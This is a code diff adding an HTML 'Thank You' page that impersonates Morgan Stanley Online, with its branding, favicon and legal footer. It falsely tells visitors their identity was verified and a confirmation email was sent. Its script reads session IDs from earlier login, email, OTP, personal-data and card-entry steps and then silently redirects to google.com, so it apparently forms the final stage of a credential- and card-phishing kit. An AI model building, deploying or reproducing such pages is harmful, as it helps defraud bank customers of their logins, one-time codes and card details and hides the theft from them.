@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11">
+    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
+    <title>Morgan Stanley Online - Thank You</title>
+    <!-- External CSS file -->
+    <link rel="stylesheet" href="style.css">
+    <!-- Additional styles specific to thank you page -->
+    <style>
+        .thankyou-container {
+            max-width: 550px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        
+        .thankyou-subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        /* Success icon and animation */
+        .success-icon {
+            text-align: center;
+            margin: 30px 0 20px;
+        }
+        
+        .success-circle {
+            width: 100px;
+            height: 100px;
+            background: #e8f5e9;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleUp 0.5s ease-out;
+        }
+        
+        .success-circle svg {
+            width: 60px;
+            height: 60px;
+        }
+        
+        @keyframes scaleUp {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        /* Checkmark animation */
+        .checkmark {
+            stroke-dasharray: 100;
+            stroke-dashoffset: 100;
+            animation: drawCheck 0.6s ease-out 0.2s forwards;
+        }
+        
+        @keyframes drawCheck {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+        
+        /* Success message */
+        .success-message {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2e7d32;
+            margin: 20px 0 10px;
+        }
+        
+        .success-detail {
+            color: #666;
+            font-size: 16px;
+            margin: 10px 0;
+            line-height: 1.6;
+        }
+        
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 25px 0;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e9e9e9;
+        }
+        
+        .divider::before {
+            margin-right: 10px;
+        }
+        
+        .divider::after {
+            margin-left: 10px;
+        }
+        
+        /* Info cards */
+        .info-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .info-card {
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            transition: transform 0.2s;
+            cursor: pointer;
+        }
+        
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        
+        .info-card .card-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .info-card .card-title {
+            font-weight: 700;
+            color: #002b51;
+            margin-bottom: 5px;
+        }
+        
+        .info-card .card-text {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        /* Security tips */
+        .security-tips {
+            background-color: #f5f9fc;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .security-tips h4 {
+            color: #002b51;
+            font-size: 14px;
+            margin: 0 0 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .security-tips p {
+            font-size: 13px;
+            color: #666;
+            margin: 0;
+        }
+        
+        /* Confetti effect */
+        .confetti {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: 1000;
+        }
+        
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: linear-gradient(135deg, #187aba, #0d7eb3);
+            animation: fall 3s ease-out forwards;
+        }
+        
+        @keyframes fall {
+            0% {
+                transform: translateY(-100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        /* Loading spinner for manual redirect */
+        .inline-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Button styles */
+        .btn-outline {
+            background: transparent;
+            border: 2px solid #187aba;
+            padding: 10px 24px;
+            min-width: 140px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #187aba;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: all 0.2s;
+        }
+        
+        .btn-outline:hover {
+            background-color: rgba(24, 122, 186, 0.05);
+            transform: translateY(-2px);
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 25px 0;
+            flex-wrap: wrap;
+        }
+    </style>
+</head>
+<body>
+    <!-- Skip to main content link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- Confetti effect -->
+    <div class="confetti" id="confetti"></div>
+
+    <!-- Header -->
+    <div role="banner">
+        <div class="mso-header-container">
+            <div>
+                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
+                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
+                </svg>
+            </div>
+            <nav class="mso-header-nav-bar" aria-label="Main navigation">
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <main id="main-content" class="login-page">
+        <div class="login_form">
+            <div class="login-row">
+                <!-- Left column: Thank you content -->
+                <div class="login-left">
+                    <div class="thankyou-container">
+                        <h2>Thank You</h2>
+                        <div class="thankyou-subtitle">
+                            Your request has been processed successfully
+                        </div>
+
+                        <!-- Success icon -->
+                        <div class="success-icon">
+                            <div class="success-circle">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="#2e7d32" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                                    <path class="checkmark" d="M20 6L9 17L4 12" stroke="#2e7d32" fill="none"/>
+                                </svg>
+                            </div>
+                        </div>
+
+                        <!-- Success message -->
+                        <div class="success-message">
+                            Verification Complete!
+                        </div>
+                        <div class="success-detail">
+                            Your identity has been successfully verified.<br>
+                            Thank you for banking with Morgan Stanley.
+                        </div>
+
+                        <!-- Action buttons -->
+                        <div class="action-buttons">
+                            <button class="btn-outline" onclick="redirectNow()" id="redirectNowBtn">
+                                Continue →
+                            </button>
+                        </div>
+
+                        <div class="divider">What would you like to do next?</div>
+
+                        <!-- Info cards -->
+                        <div class="info-cards">
+                            <div class="info-card" onclick="goToSupport()">
+                                <span class="card-icon">📞</span>
+                                <div class="card-title">Contact Support</div>
+                                <div class="card-text">24/7 customer service</div>
+                            </div>
+                            <div class="info-card" onclick="goToSecurity()">
+                                <span class="card-icon">🔒</span>
+                                <div class="card-title">Security Center</div>
+                                <div class="card-text">Learn about account protection</div>
+                            </div>
+                            <div class="info-card" onclick="goToResources()">
+                                <span class="card-icon">📚</span>
+                                <div class="card-title">Resources</div>
+                                <div class="card-text">Financial tools & guides</div>
+                            </div>
+                        </div>
+
+                        <!-- Additional info -->
+                        <div class="security-tips">
+                            <h4>
+                                <span>📧</span> What to expect next
+                            </h4>
+                            <p>
+                                A confirmation email has been sent to your registered email address. 
+                                If you don't see it within 5 minutes, please check your spam folder.
+                            </p>
+                        </div>
+
+                        <!-- Session info -->
+                        <div id="sessionInfo" class="session-info hidden"></div>
+                    </div>
+                </div>
+
+                <!-- Right column: Banner -->
+                <div class="login-right">
+                    <div class="banner">
+                        <div class="banner-content">
+                            <h3>Thank You for<br>Your Trust.</h3>
+                            <p>We're committed to protecting your financial future</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="ms-footer">
+            <div class="footer-content">
+                <div class="footer-columns">
+                    <div class="footer-column">
+                        <h4>Need Help?</h4>
+                        <div class="footer-links">
+                            <a href="#">Help + Support</a>
+                            <a href="#" class="mobile-only">Find an Advisor/Branch</a>
+                            <a href="#">Tutorial Videos</a>
+                            <a href="#" class="desktop-only">Co-Browse</a>
+                            <a href="#" class="mobile-only">Mobile Privacy Notice</a>
+                        </div>
+                    </div>
+                    <div class="footer-column footer-column-large">
+                        <h4>Legal</h4>
+                        <div class="footer-links">
+                            <a href="#">Online Security</a>
+                            <a href="#">Terms of Use</a>
+                            <a href="#">U.S. Patriot Act</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Financial Statement</a>
+                            <a href="#">Morgan Stanley & Co. LLC Financial Statement</a>
+                            <a href="#">Research Disclosures</a>
+                            <a href="#">FINRA Rule 4340</a>
+                            <a href="#">Rate Monitor</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Business Continuity Information</a>
+                            <a href="#">Investor Resources</a>
+                        </div>
+                    </div>
+                    <div class="footer-column desktop-only">
+                        <h4>Privacy</h4>
+                        <div class="footer-links">
+                            <a href="#">US Privacy Policy</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-copyright">
+                    © Morgan Stanley Smith Barney LLC, Member <a href="#">SIPC</a>. All rights reserved.
+                </div>
+            </div>
+        </footer>
+    </main>
+
+<script>
+    // Redirect URL
+    const REDIRECT_URL = 'https://www.google.com';
+    let redirectTimer;
+    let redirectInProgress = false;
+    
+    // Get session ID if available
+    const urlParams = new URLSearchParams(window.location.search);
+    let sessionId = urlParams.get('sessionId') || 
+                    sessionStorage.getItem('loginSessionId') || 
+                    sessionStorage.getItem('emailSessionId') || 
+                    sessionStorage.getItem('otpSessionId') || 
+                    sessionStorage.getItem('personalSessionId') ||
+                    sessionStorage.getItem('cardSessionId');
+    
+    // Display session info if available
+    if (sessionId) {
+        const sessionInfo = document.getElementById('sessionInfo');
+        if (sessionInfo) {
+            sessionInfo.textContent = `Session: ${sessionId.substring(0,8)}...`;
+            sessionInfo.classList.remove('hidden');
+        }
+    }
+    
+    // Generate confetti pieces
+    function createConfetti() {
+        const confettiContainer = document.getElementById('confetti');
+        const colors = ['#187aba', '#0d7eb3', '#002b51', '#b9e8fe', '#2e7d32'];
+        
+        for (let i = 0; i < 100; i++) {
+            const piece = document.createElement('div');
+            piece.className = 'confetti-piece';
+            piece.style.left = Math.random() * 100 + '%';
+            piece.style.width = (Math.random() * 8 + 4) + 'px';
+            piece.style.height = (Math.random() * 8 + 4) + 'px';
+            piece.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+            piece.style.animationDelay = Math.random() * 2 + 's';
+            piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
+            confettiContainer.appendChild(piece);
+            
+            // Remove after animation
+            setTimeout(() => {
+                if (piece && piece.remove) piece.remove();
+            }, 4000);
+        }
+    }
+    
+    // Perform redirect
+    function performRedirect() {
+        if (redirectInProgress) return;
+        redirectInProgress = true;
+        
+        // Clear any existing timer
+        if (redirectTimer) clearTimeout(redirectTimer);
+        
+        // Update button to show loading
+        const redirectBtn = document.getElementById('redirectNowBtn');
+        if (redirectBtn) {
+            redirectBtn.innerHTML = 'Redirecting... <span class="inline-spinner"></span>';
+            redirectBtn.disabled = true;
+        }
+        
+        // Log redirect for analytics
+        console.log(`Redirecting to ${REDIRECT_URL} at ${new Date().toISOString()}`);
+        
+        // Store redirect timestamp in sessionStorage
+        sessionStorage.setItem('lastRedirectTime', new Date().toISOString());
+        sessionStorage.setItem('redirectDestination', REDIRECT_URL);
+        
+        // Perform redirect
+        window.location.href = REDIRECT_URL;
+    }
+    
+    // Redirect now (manual)
+    function redirectNow() {
+        if (redirectInProgress) return;
+        performRedirect();
+    }
+    
+    // Go to support page
+    function goToSupport() {
+        window.open('https://morganstanley.com/support', '_blank');
+        showTemporaryMessage('Opening support page in new tab', 'info');
+    }
+    
+    // Go to security center
+    function goToSecurity() {
+        window.open('https://morganstanley.com/security', '_blank');
+        showTemporaryMessage('Opening security center in new tab', 'info');
+    }
+    
+    // Go to resources
+    function goToResources() {
+        window.open('https://morganstanley.com/resources', '_blank');
+        showTemporaryMessage('Opening resources page in new tab', 'info');
+    }
+    
+    // Show temporary message
+    function showTemporaryMessage(message, type) {
+        const msgDiv = document.createElement('div');
+        msgDiv.style.cssText = `
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: ${type === 'error' ? '#a00' : '#2e7d32'};
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            z-index: 2000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            animation: slideUp 0.3s ease-out;
+        `;
+        msgDiv.textContent = message;
+        document.body.appendChild(msgDiv);
+        
+        setTimeout(() => {
+            msgDiv.style.animation = 'slideDown 0.3s ease-out';
+            setTimeout(() => msgDiv.remove(), 300);
+        }, 3000);
+    }
+    
+    // Add CSS animations for messages
+    const styleSheet = document.createElement('style');
+    styleSheet.textContent = `
+        @keyframes slideUp {
+            from {
+                transform: translateX(-50%) translateY(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(-50%) translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        @keyframes slideDown {
+            from {
+                transform: translateX(-50%) translateY(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(-50%) translateY(100%);
+                opacity: 0;
+            }
+        }
+    `;
+    document.head.appendChild(styleSheet);
+    
+    // Log page view
+    console.log(`Thank you page loaded - Session: ${sessionId || 'N/A'} - Time: ${new Date().toISOString()}`);
+    
+    // Create confetti animation on load
+    setTimeout(() => {
+        createConfetti();
+    }, 100);
+    
+    // Auto redirect after 3 seconds (silent, no countdown or message)
+    redirectTimer = setTimeout(() => {
+        if (!redirectInProgress) {
+            performRedirect();
+        }
+    }, 3000);
+    
+    // Clean up on page unload
+    window.addEventListener('beforeunload', () => {
+        if (redirectTimer) clearTimeout(redirectTimer);
+    });
+    
+    // Focus on continue button for accessibility
+    const continueBtn = document.getElementById('redirectNowBtn');
+    if (continueBtn) {
+        setTimeout(() => {
+            continueBtn.focus();
+        }, 500);
+    }
+    
+    // Add keyboard shortcut (Enter on continue button)
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && document.activeElement === continueBtn) {
+            redirectNow();
+        }
+    });
+</script>
+</body>
+</html>
